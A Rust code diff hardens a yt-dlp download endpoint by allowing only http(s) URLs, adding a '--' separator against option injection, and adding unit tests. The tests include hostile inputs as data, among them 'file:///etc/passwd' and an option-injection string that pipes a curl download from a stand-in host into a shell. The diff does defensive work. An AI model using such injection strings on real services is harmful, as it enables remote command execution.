@@ -30,6 +30,17 @@ fn is_audio_format(f: &str) -> bool {
     AUDIO_FORMATS.contains(&f)
 }
 
+/// Accept only `http(s)` sources.
+///
+/// yt-dlp happily resolves `file://`, and its generic extractor will follow
+/// plenty of other schemes, so an unrestricted input turns this endpoint into a
+/// local-file reader and an SSRF gadget against whatever the container can
+/// reach. Everything this tool is for is served over HTTP.
+fn is_supported_url(url: &str) -> bool {
+    let lower = url.to_ascii_lowercase();
+    lower.starts_with("http://") || lower.starts_with("https://")
+}
+
 /// Map our format name to yt-dlp's `--audio-format` value.
 fn ytdlp_audio_format(f: &str) -> &str {
     match f {
@@ -47,9 +58,18 @@ pub async fn start_download(
     if url.is_empty() {
         return Err((StatusCode::BAD_REQUEST, "url is required".into()));
     }
+    if !is_supported_url(&url) {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            "url must start with http:// or https://".into(),
+        ));
+    }
     let format = req.format.trim().to_lowercase();
     if !is_audio_format(&format) && !VIDEO_FORMATS.contains(&format.as_str()) {
-        return Err((StatusCode::BAD_REQUEST, format!("unsupported format: {format}")));
+        return Err((
+            StatusCode::BAD_REQUEST,
+            format!("unsupported format: {format}"),
+        ));
     }
     let audio = is_audio_format(&format);
     let quality = if req.quality.trim().is_empty() {
@@ -58,19 +78,29 @@ pub async fn start_download(
         req.quality.trim().to_string()
     };
     if !audio && !QUALITIES.contains(&quality.as_str()) {
-        return Err((StatusCode::BAD_REQUEST, format!("unsupported quality: {quality}")));
+        return Err((
+            StatusCode::BAD_REQUEST,
+            format!("unsupported quality: {quality}"),
+        ));
     }
 
     let id = Uuid::new_v4().to_string();
     let dir = state.job_dir(&id);
     if let Err(e) = fs::create_dir_all(&dir) {
-        return Err((StatusCode::INTERNAL_SERVER_ERROR, format!("mkdir failed: {e}")));
+        return Err((
+            StatusCode::INTERNAL_SERVER_ERROR,
+            format!("mkdir failed: {e}"),
+        ));
     }
 
     let detail = if audio {
         format!("audio · {format}")
     } else {
-        let q = if quality == "best" { "best".to_string() } else { format!("{quality}p") };
+        let q = if quality == "best" {
+            "best".to_string()
+        } else {
+            format!("{quality}p")
+        };
         format!("{q} · {format}")
     };
 
@@ -135,6 +165,9 @@ async fn run_download(
         args.push("--merge-output-format".into());
         args.push(format.clone());
     }
+    // `--` first: without it a URL that begins with a dash is parsed as a
+    // yt-dlp option, and options like `--exec` run arbitrary commands.
+    args.push("--".into());
     args.push(url);
 
     let mut cmd = Command::new("yt-dlp");
@@ -171,7 +204,11 @@ async fn run_download(
                     j.output_size = size;
                 });
             }
-            None => fail(&state, &id, "download finished but no output file was produced".into()),
+            None => fail(
+                &state,
+                &id,
+                "download finished but no output file was produced".into(),
+            ),
         },
         Ok(r) => fail(
             &state,
@@ -209,9 +246,45 @@ fn newest_file(dir: &Path) -> Option<PathBuf> {
         }
         let modified = entry.metadata().ok().and_then(|m| m.modified().ok());
         let Some(modified) = modified else { continue };
-        if best.as_ref().map_or(true, |(t, _)| modified >= *t) {
+        if best.as_ref().is_none_or(|(t, _)| modified >= *t) {
             best = Some((modified, path));
         }
     }
     best.map(|(_, p)| p)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn accepts_http_and_https() {
+        assert!(is_supported_url("https://example.com/watch?v=x"));
+        assert!(is_supported_url("http://example.com/x"));
+        assert!(is_supported_url("HTTPS://EXAMPLE.COM/x"));
+    }
+
+    #[test]
+    fn rejects_local_and_exotic_schemes() {
+        assert!(!is_supported_url("file:///etc/passwd"));
+        assert!(!is_supported_url("ftp://example.com/x"));
+        assert!(!is_supported_url("/etc/passwd"));
+        assert!(!is_supported_url("example.com/x"));
+    }
+
+    #[test]
+    fn rejects_option_lookalikes() {
+        // These would otherwise reach yt-dlp's argument parser.
+        assert!(!is_supported_url("--exec=curl evil.example|sh"));
+        assert!(!is_supported_url("-o/tmp/pwned"));
+    }
+
+    #[test]
+    fn parses_progress_percentages() {
+        assert_eq!(parse_percent(" 42.3%"), Some(42.3));
+        assert_eq!(parse_percent("100.0%"), Some(100.0));
+        assert_eq!(parse_percent("  N/A%"), None);
+        // Out-of-range values are clamped rather than trusted.
+        assert_eq!(parse_percent("250%"), Some(100.0));
+    }
 }
